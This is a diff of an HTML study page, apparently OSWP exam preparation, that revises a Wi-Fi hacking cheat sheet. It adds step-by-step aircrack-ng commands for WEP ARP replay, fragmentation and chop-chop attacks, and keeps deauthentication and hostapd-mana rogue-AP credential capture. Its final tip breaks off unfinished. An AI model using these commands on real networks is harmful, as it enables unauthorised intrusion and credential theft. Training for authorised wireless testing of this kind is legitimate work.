@@ -174,7 +174,7 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="chapter-06---another-quick-cheat-sheet"><a class="header" href="#chapter-06---another-quick-cheat-sheet">Chapter 0.6 - Another Quick Cheat Sheet</a></h1>
-<p>Here's the revised cheat sheet for Wi-Fi hacking, including <strong>WPA2/WPA3 Enterprise attacks using manual methods</strong> like <strong><code>hostapd-mana</code></strong> instead of automated tools.</p>
+<p>Here's the updated Wi-Fi Hacking Cheat Sheet with the <strong>ARP replay attack</strong>, <strong>fragmentation attack</strong>, and <strong>chop-chop attack</strong> for <strong>WEP</strong> added.</p>
 <hr />
 <h3 id="wi-fi-hacking-cheat-sheet-manual-approach"><a class="header" href="#wi-fi-hacking-cheat-sheet-manual-approach"><strong>Wi-Fi Hacking Cheat Sheet (Manual Approach)</strong></a></h3>
 <hr />
@@ -189,11 +189,11 @@
 </ul>
 <h4 id="2-wi-fi-encryption-types"><a class="header" href="#2-wi-fi-encryption-types"><strong>2. Wi-Fi Encryption Types</strong></a></h4>
 <ul>
-<li><strong>WEP</strong>: Vulnerable, uses RC4, 24-bit IV (easily cracked using tools like <code>aircrack-ng</code>)</li>
-<li><strong>WPA</strong>: TKIP (Temporal Key Integrity Protocol), RC4 (deprecated)</li>
-<li><strong>WPA2</strong>: CCMP/AES encryption, commonly used but vulnerable to KRACK</li>
-<li><strong>WPA3</strong>: Uses SAE (Simultaneous Authentication of Equals), more secure but requires advanced attacks</li>
-<li><strong>WPA2/WPA3 Enterprise</strong>: EAP (Extensible Authentication Protocol) with a RADIUS server for user authentication</li>
+<li><strong>WEP</strong>: Vulnerable, uses RC4, 24-bit IV (easily cracked using packet injection attacks).</li>
+<li><strong>WPA</strong>: TKIP (Temporal Key Integrity Protocol), RC4 (deprecated).</li>
+<li><strong>WPA2</strong>: CCMP/AES encryption, vulnerable to KRACK.</li>
+<li><strong>WPA3</strong>: Uses SAE (Simultaneous Authentication of Equals), more secure but still has advanced attack vectors.</li>
+<li><strong>WPA2/WPA3 Enterprise</strong>: EAP (Extensible Authentication Protocol) with a RADIUS server for user authentication.</li>
 </ul>
 <hr />
 <h4 id="3-tools-for-wireless-hacking"><a class="header" href="#3-tools-for-wireless-hacking"><strong>3. Tools for Wireless Hacking</strong></a></h4>
@@ -213,46 +213,127 @@
 </ul>
 </li>
 <li>
-<p><strong><code>aireplay-ng</code></strong>: Deauthenticate or inject packets</p>
+<p><strong><code>aireplay-ng</code></strong>: Deauthenticate or inject packets, useful for WEP attacks.</p>
 <ul>
 <li>Deauth: <code>aireplay-ng -0 10 -a &lt;AP MAC&gt; wlan0mon</code></li>
 <li>Fake auth: <code>aireplay-ng -1 0 -a &lt;AP MAC&gt; -h &lt;your MAC&gt; wlan0mon</code></li>
 </ul>
 </li>
 <li>
-<p><strong><code>aircrack-ng</code></strong>: Crack captured packets</p>
+<p><strong><code>aircrack-ng</code></strong>: Crack captured packets (WEP/WPA/WPA2).</p>
 <ul>
 <li>Crack WEP: <code>aircrack-ng &lt;capture file&gt;.cap</code></li>
 <li>Crack WPA/WPA2: <code>aircrack-ng -w &lt;wordlist&gt; &lt;capture file&gt;.cap</code></li>
 </ul>
 </li>
-<li>
-<p><strong><code>hostapd-mana</code></strong>: A specialized version of <code>hostapd</code> for man-in-the-middle attacks on WPA2/WPA3 Enterprise.</p>
-</li>
 </ul>
 <hr />
 <h4 id="4-attacking-wep"><a class="header" href="#4-attacking-wep"><strong>4. Attacking WEP</strong></a></h4>
+<h5 id="41-arp-replay-attack-speed-up-iv-collection"><a class="header" href="#41-arp-replay-attack-speed-up-iv-collection"><strong>4.1. ARP Replay Attack (Speed Up IV Collection)</strong></a></h5>
 <ul>
 <li>
-<p><strong>Capture the handshake:</strong></p>
+<p><strong>Step 1: Start capturing packets</strong>:</p>
 <ul>
 <li><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon</code></li>
 </ul>
 </li>
 <li>
-<p><strong>Fake Authentication:</strong></p>
+<p><strong>Step 2: Fake Authentication</strong> (if needed):</p>
 <ul>
 <li><code>aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon</code></li>
 </ul>
 </li>
 <li>
-<p><strong>ARP Request Replay (inject packets to speed up cracking):</strong></p>
+<p><strong>Step 3: ARP Replay Attack</strong> (Injecting ARP packets to increase IV collection):</p>
 <ul>
-<li><code>aireplay-ng -3 -b &lt;BSSID&gt; wlan0mon</code></li>
+<li><code>aireplay-ng -3 -b &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon</code></li>
+</ul>
+<p>You’ll see messages indicating ARP packets are being replayed. This attack increases the number of weak IVs captured.</p>
+</li>
+<li>
+<p><strong>Step 4: Crack WEP key</strong>:</p>
+<ul>
+<li><code>aircrack-ng &lt;output file&gt;.cap</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="42-fragmentation-attack"><a class="header" href="#42-fragmentation-attack"><strong>4.2. Fragmentation Attack</strong></a></h5>
+<p>The fragmentation attack is useful when no clients are available, and you can break a WEP key by fragmenting a packet.</p>
+<ul>
+<li>
+<p><strong>Step 1: Start capturing packets</strong>:</p>
+<ul>
+<li><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon</code></li>
 </ul>
 </li>
 <li>
-<p><strong>Crack WEP Key:</strong></p>
+<p><strong>Step 2: Fake Authentication</strong> (if needed):</p>
+<ul>
+<li><code>aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Step 3: Perform Fragmentation Attack</strong>:</p>
+<ul>
+<li><code>aireplay-ng -5 -b &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon</code></li>
+</ul>
+<p>The goal is to capture a packet and fragment it, producing keystream data.</p>
+</li>
+<li>
+<p><strong>Step 4: Use Packetforge-ng to create an ARP packet</strong>:</p>
+<ul>
+<li>Once you have a usable keystream, use <code>packetforge-ng</code> to create a forged ARP request:
+<pre><code class="language-bash">packetforge-ng -0 -a &lt;AP MAC&gt; -h &lt;your MAC&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;keystream file&gt; -w &lt;arp_packet&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Step 5: Inject the ARP packet</strong>:</p>
+<ul>
+<li><code>aireplay-ng -2 -r &lt;arp_packet&gt; wlan0mon</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Step 6: Crack the WEP key</strong>:</p>
+<ul>
+<li><code>aircrack-ng &lt;output file&gt;.cap</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="43-chop-chop-attack"><a class="header" href="#43-chop-chop-attack"><strong>4.3. Chop-Chop Attack</strong></a></h5>
+<p>The chop-chop attack helps you decrypt one byte of an encrypted WEP packet and obtain the keystream.</p>
+<ul>
+<li>
+<p><strong>Step 1: Start capturing packets</strong>:</p>
+<ul>
+<li><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;output file&gt; wlan0mon</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Step 2: Perform Chop-Chop Attack</strong>:</p>
+<ul>
+<li><code>aireplay-ng -4 -b &lt;BSSID&gt; -h &lt;your MAC&gt; wlan0mon</code></li>
+</ul>
+<p>You will capture part of a packet that can be used to forge ARP packets or perform decryption.</p>
+</li>
+<li>
+<p><strong>Step 3: Use <code>packetforge-ng</code> to create an ARP packet</strong>:</p>
+<ul>
+<li>Create an ARP request using the obtained keystream:
+<pre><code class="language-bash">packetforge-ng -0 -a &lt;AP MAC&gt; -h &lt;your MAC&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;keystream file&gt; -w &lt;arp_packet&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Step 4: Inject the ARP packet</strong>:</p>
+<ul>
+<li><code>aireplay-ng -2 -r &lt;arp_packet&gt; wlan0mon</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Step 5: Crack the WEP key</strong>:</p>
 <ul>
 <li><code>aircrack-ng &lt;output file&gt;.cap</code></li>
 </ul>
@@ -282,53 +363,7 @@
 </li>
 </ul>
 <hr />
-<h4 id="6-wps-attack-manual-approach"><a class="header" href="#6-wps-attack-manual-approach"><strong>6. WPS Attack (Manual Approach)</strong></a></h4>
-<ul>
-<li>
-<p><strong>Find WPS-enabled APs</strong> using <code>wash</code>:</p>
-<ul>
-<li><code>wash -i wlan0mon</code></li>
-</ul>
-</li>
-<li>
-<p><strong>Attempt to brute force the WPS PIN manually with <code>reaver</code> or manually crafted scripts</strong>.</p>
-</li>
-</ul>
-<hr />
-<h4 id="7-hidden-ssid-discovery"><a class="header" href="#7-hidden-ssid-discovery"><strong>7. Hidden SSID Discovery</strong></a></h4>
-<ul>
-<li>
-<p><strong>Capture Hidden SSID:</strong></p>
-<ul>
-<li><code>airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;output file&gt; wlan0mon</code></li>
-</ul>
-</li>
-<li>
-<p><strong>Deauth Clients to reveal SSID:</strong></p>
-<ul>
-<li><code>aireplay-ng -0 10 -a &lt;BSSID&gt; wlan0mon</code></li>
-</ul>
-</li>
-</ul>
-<hr />
-<h4 id="8-evil-twin-attack-manual-setup"><a class="header" href="#8-evil-twin-attack-manual-setup"><strong>8. Evil Twin Attack (Manual Setup)</strong></a></h4>
-<ul>
-<li>
-<p><strong>Set up Rogue AP with <code>hostapd</code>:</strong></p>
-<ul>
-<li>Create a configuration file for <code>hostapd</code> to mimic the target AP's SSID and encryption settings.</li>
-<li>Start <code>hostapd</code>:
-<pre><code class="language-bash">hostapd /path/to/hostapd.conf
-</code></pre>
-</li>
-</ul>
-</li>
-<li>
-<p><strong>Capture client traffic and credentials manually using a packet capture tool</strong> like <code>tcpdump</code> or <code>wireshark</code>.</p>
-</li>
-</ul>
-<hr />
-<h4 id="9-wpa2wpa3-enterprise-attacks-manual"><a class="header" href="#9-wpa2wpa3-enterprise-attacks-manual"><strong>9. WPA2/WPA3 Enterprise Attacks (Manual)</strong></a></h4>
+<h4 id="6-wpa2wpa3-enterprise-attacks-manual"><a class="header" href="#6-wpa2wpa3-enterprise-attacks-manual"><strong>6. WPA2/WPA3 Enterprise Attacks (Manual)</strong></a></h4>
 <ul>
 <li>
 <p><strong>Rogue AP Attack using <code>hostapd-mana</code></strong> (WPA2 Enterprise):</p>
@@ -338,7 +373,7 @@
 </code></pre>
 </li>
 <li><strong>Configure <code>hostapd-mana</code>:</strong>
-Edit the configuration file (<code>hostapd-mana.conf</code>) to match the SSID of the target network and set up the rogue AP to capture enterprise credentials.</li>
+Edit the configuration file (<code>hostapd-mana.conf</code>) to mimic the SSID of the target network and set up the rogue AP to capture enterprise credentials.</li>
 <li><strong>Run <code>hostapd-mana</code>:</strong>
 <pre><code class="language-bash">hostapd-mana /path/to/hostapd-mana.conf
 </code></pre>
@@ -363,29 +398,7 @@ Edit the configuration file (<code>hostapd-mana.conf</code>) to match the SSID o
 </li>
 </ul>
 <hr />
-<h4 id="10-manual-eap-credential-cracking-peapmschapv2"><a class="header" href="#10-manual-eap-credential-cracking-peapmschapv2"><strong>10. Manual EAP Credential Cracking (PEAP/MSCHAPv2)</strong></a></h4>
-<ul>
-<li>
-<p><strong>Crack LEAP Credentials with <code>asleap</code>:</strong></p>
-<ul>
-<li>After capturing the challenge and response from the LEAP authentication, use:
-<pre><code class="language-bash">asleap -C &lt;challenge&gt; -R &lt;response&gt; -W &lt;wordlist&gt;
-</code></pre>
-</li>
-</ul>
-</li>
-<li>
-<p><strong>Crack PEAP/MSCHAPv2 Credentials with <code>john</code></strong>:</p>
-<ul>
-<li>Once you capture the EAP-MSCHAPv2 handshake:
-<pre><code class="language-bash">john --wordlist=&lt;wordlist&gt; eap-hashes.txt
-</code></pre>
-</li>
-</ul>
-</li>
-</ul>
-<hr />
-<h4 id="11-miscellaneous-commands"><a class="header" href="#11-miscellaneous-commands"><strong>11. Miscellaneous Commands</strong></a></h4>
+<h4 id="7-miscellaneous-commands"><a class="header" href="#7-miscellaneous-commands"><strong>7. Miscellaneous Commands</strong></a></h4>
 <ul>
 <li>
 <p><strong>Change MAC Address (if needed):</strong></p>
@@ -409,23 +422,22 @@ Edit the configuration file (<code>hostapd-mana.conf</code>) to match the SSID o
 </li>
 </ul>
 <hr />
-<h4 id="12-practice"><a class="header" href="#12-practice"><strong>12. Practice</strong></a></h4>
+<h4 id="8-practice"><a class="header" href="#8-practice"><strong>8. Practice</strong></a></h4>
 <ul>
 <li>
-<p><strong>Set up your own test environment using a router</strong>: Configure WPA2 Enterprise with a RADIUS server to simulate realistic attacks and practice safely.</p>
+<p><strong>Set up your own test environment using a router</strong>: Configure WEP or WPA2 Enterprise with a RADIUS server to simulate realistic attacks and practice safely.</p>
 </li>
 <li>
-<p><strong>Use <code>Wireshark</code> to analyze captured traffic</strong>: Understanding the structure of EAP handshakes and PEAP/MSCHAPv2 exchanges will help during credential interception.</p>
+<p><strong>Use <code>Wireshark</code> to analyze captured traffic</strong>: Understand the structure of WEP and WPA/WPA2 handshakes and traffic exchanges to master credential interception.</p>
 </li>
 </ul>
 <hr />
 <h3 id="tips-for-the-oswp-exam"><a class="header" href="#tips-for-the-oswp-exam"><strong>Tips for the OSWP Exam</strong></a></h3>
 <ul>
-<li><strong>Understand each step of manual attacks</strong>: From setting up a rogue AP to intercepting and cracking credentials, focus on the underlying protocols.</li>
-<li><strong>Capture WPA2 Enterprise credentials</strong>: Practice using <code>hostapd-mana</code> to set up rogue APs and capture PEAP/MSCHAPv2 handshakes.</li>
-<li><strong>Crack captured hashes manually</strong> using tools like <code>john</code> or <code>asleap</code>.</li>
+<li>Focus on <strong>manual attack vectors</strong> like ARP Replay, Fragmentation, and Chop-Chop for WEP.</li>
+<li>Practice setting up and attacking WPA2 Enterprise using <strong><code>hostapd-mana</code></strong>.</li>
+<li>Learn how to <strong>crack captured hashes</strong> from WEP and WPA handshakes using <strong>manual tools</strong> like</li>
 </ul>
-<p>Good luck with your OSWP exam preparation! Let me know if you need further clarifications or details.</p>
 
                     </main>
 
